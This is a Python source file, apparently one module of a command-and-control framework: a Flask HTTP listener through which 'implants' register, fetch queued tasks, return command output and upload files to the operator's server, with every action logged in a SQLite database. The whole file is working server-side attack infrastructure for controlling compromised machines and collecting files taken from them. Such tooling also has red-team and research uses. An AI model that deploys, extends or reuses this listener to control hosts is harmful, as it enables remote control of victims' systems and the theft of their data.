from flask import Flask, request, jsonify, send_file
from werkzeug.serving import make_server
from werkzeug.utils import secure_filename
import threading, json, datetime, sqlite3, os

class HTTPListener:
    con = None
    cur = None
    
    def __init__(self):
        with open('modules/listeners/HTTP.json') as f:
            cfg = json.load(f)

        self.host = cfg["host"]
        self.port = cfg["port"]
        self.app = Flask(__name__)
        self.server = None
        self.con = sqlite3.connect(".db", check_same_thread=False)
        self.cur = self.con.cursor()
        self.app.add_url_rule('/register', 'register', self.register, methods=['POST'])
        self.app.add_url_rule('/<agent_id>/tasks', 'get_tasks', self.get_tasks, methods=['GET'])
        self.app.add_url_rule('/<agent_id>/results', 'post_results', self.post_results, methods=['POST'])
        self.app.add_url_rule('/<agent_id>/upload', 'upload_file', self.upload_file, methods=['POST'])

    class ServerThread(threading.Thread):
        def __init__(self, app, host, port):
            threading.Thread.__init__(self)
            self.srv = make_server(host, port, app)
            self.ctx = app.app_context()
            self.ctx.push()

        def run(self):
            self.srv.serve_forever()

        def shutdown(self):
            self.srv.shutdown()

    def update_history(self, agent_id, action_type, content):
        self.cur.execute(
            "INSERT INTO actions (date, action_type, content, implant_id) VALUES (?, ?, ?, ?)",
            (datetime.datetime.now(), action_type, content, agent_id)
        )
        self.con.commit()

    def get_tasks(self, agent_id):
        try:
            self.update_last_seen(agent_id)
            self.cur.execute("""
                SELECT it.id, t.content 
                FROM implant_task it
                JOIN tasks t ON it.task_id = t.id
                WHERE it.executed = 0
                AND it.implant_id = ?
                ORDER BY it.date ASC
                LIMIT 1
            """, (agent_id,))  #kill all tuples
            task = self.cur.fetchone()
            
            if not task:
                return jsonify({"status": "no tasks"}), 200
                
            task_id, content = task
            self.update_history(agent_id, "get_task", content)
            self.cur.execute(
                "UPDATE implant_task SET executed = 1 WHERE id = ? AND implant_id = ?",
                (task_id, agent_id)
            )
            self.con.commit()
            return jsonify({"task": content}), 200
        except Exception as e:
            return jsonify({"error": str(e)}), 500

    def post_results(self, agent_id):        
        try:
            self.update_last_seen(agent_id)
            data = request.get_json()
            if not data or 'result' not in data:
                return jsonify({"error": "Invalid request"}), 400
                
            self.update_history(agent_id, "post_result", data['result'])
            return jsonify({"status": "result received"}), 200
        except Exception as e:
            return jsonify({"error": str(e)}), 500
    
    def register(self):
        try:
            implant_data = request.get_json(silent=True)
            if implant_data is None:
                return jsonify({"error": "Invalid JSON format"}), 400
            
            #parsing the fields dinamically
            base_fields = {
                'register_date': datetime.datetime.now(),
                'last_seen': datetime.datetime.now()
            }
            all_fields = {**base_fields, **implant_data}
            self.cur.execute("PRAGMA table_info(implants)")
            valid_columns = [col[1] for col in self.cur.fetchall()]
            filtered_fields = {k: v for k, v in all_fields.items() if k in valid_columns}
            columns = ', '.join(filtered_fields.keys())
            placeholders = ', '.join(['?'] * len(filtered_fields))
            values = list(filtered_fields.values())
            self.cur.execute(
                f"INSERT INTO implants ({columns}) VALUES ({placeholders})",
                values
            )
            self.con.commit()

            #get the agent id
            agent_id = self.cur.lastrowid

            self.update_history(agent_id, "register", "New implant registered")
            return jsonify({"agent_id": agent_id}), 201
        
        except sqlite3.Error as e:
            return jsonify({"error": f"Database error: {str(e)}"}), 500
        except Exception as e:
            return jsonify({"error": f"Unexpected error: {str(e)}"}), 501
    
    def update_last_seen(self, agent_id):
        self.cur.execute(
            "UPDATE implants SET last_seen = ? WHERE id = ?",
            (datetime.datetime.now(), agent_id)
        )
        self.con.commit()
        return
    
    def upload_file(self, agent_id):
        try:
            self.update_last_seen(agent_id)
            if 'file' not in request.files:
                return jsonify({"error": "No file part"}), 400
                
            file = request.files['file']
            if file.filename == '':
                return jsonify({"error": "No selected file"}), 400
            
            # Create uploads directory if needed
            os.makedirs("uploads", exist_ok=True)
            
            # Save file with agent_id prefix
            filename = f"{agent_id}_{secure_filename(file.filename)}"
            file_path = os.path.join("uploads", filename)
            file.save(file_path)
            
            self.update_history(agent_id, "file_upload", filename)
            return jsonify({
                "status": "success",
                "filename": filename,
                "size": os.path.getsize(file_path)
            }), 200
        except Exception as e:
            return jsonify({"error": str(e)}), 500

    def start(self):
        if not self.server:
            self.server = self.ServerThread(self.app, self.host, self.port)
            self.server.start()
            print(f"[*] HTTP listener started on {self.host}:{self.port}")

    def stop(self):
        if self.server:
            self.server.shutdown()
            self.server.join()
            self.server = None
            print("[*] HTTP listener stopped")

def module():
    return HTTPListener()